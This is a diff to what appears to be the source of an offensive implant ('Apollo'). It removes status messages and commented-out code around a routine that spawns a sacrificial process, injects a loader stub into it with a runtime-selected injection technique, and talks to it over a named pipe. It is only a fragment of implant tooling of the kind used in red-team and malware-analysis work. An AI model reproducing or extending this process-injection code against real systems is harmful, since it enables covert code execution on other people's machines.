@@ -202,16 +202,11 @@ namespace Apollo.CommandModules
             {
                 sacrificialProcess = new SacrificialProcesses.SacrificialProcess(startupArgs.Application, startupArgs.Arguments, true);
 
-                ApolloTaskResponse response;
+                ApolloTaskResponse artifactResp;
 
                 if (sacrificialProcess.Start())
                 {
-                    string status = "";
-                    if (!string.IsNullOrEmpty(startupArgs.Arguments))
-                        status = $"Sacrificial process spawned '{startupArgs.Application} {startupArgs.Arguments}' (PID: {sacrificialProcess.PID})\n";
-                    else
-                        status = $"Sacrificial process spawned  {startupArgs.Application} (PID: {sacrificialProcess.PID})\n";
-                    job.AddOutput(status);
+                    
                     job.ProcessID = (int)sacrificialProcess.PID;
                     job.sacrificialProcess = sacrificialProcess;
 
@@ -348,11 +343,6 @@ namespace Apollo.CommandModules
 
             try
             {
-
-                ApolloTaskResponse response; //= new SCTaskResp(job.Task.id, false, String.Format("Sacrificial process spawned with PID: {0}", sacrificialProcess.PID), "");
-                                             //implant.TryPostResponse(response);
-                                             ////byte[] tempBytes = File.ReadAllBytes("C:\\Users\\Public\\helloworldsc_noargs.bin");
-
                 var injectionType = Injection.InjectionTechnique.GetInjectionTechnique();
                 var injectionHandler = (Injection.InjectionTechnique)Activator.CreateInstance(injectionType, new object[] { loaderStub, (uint)pid });
                 //Injection.CreateRemoteThreadInjection crt = new Injection.CreateRemoteThreadInjection(loaderStub, (uint)pid);
@@ -360,9 +350,6 @@ namespace Apollo.CommandModules
 
                 if (injectionHandler.Inject())
                 {
-                    //sacrificialProcess.CreateNewRemoteThread(tempBytes);
-                    //sacrificialProcess.ResumeThread();
-                    // bool bRet = sacrificialProcess.StillActive();
                     NamedPipeClientStream pipeClient = new NamedPipeClientStream(pipeName);
 
                     pipeClient.Connect(30000);
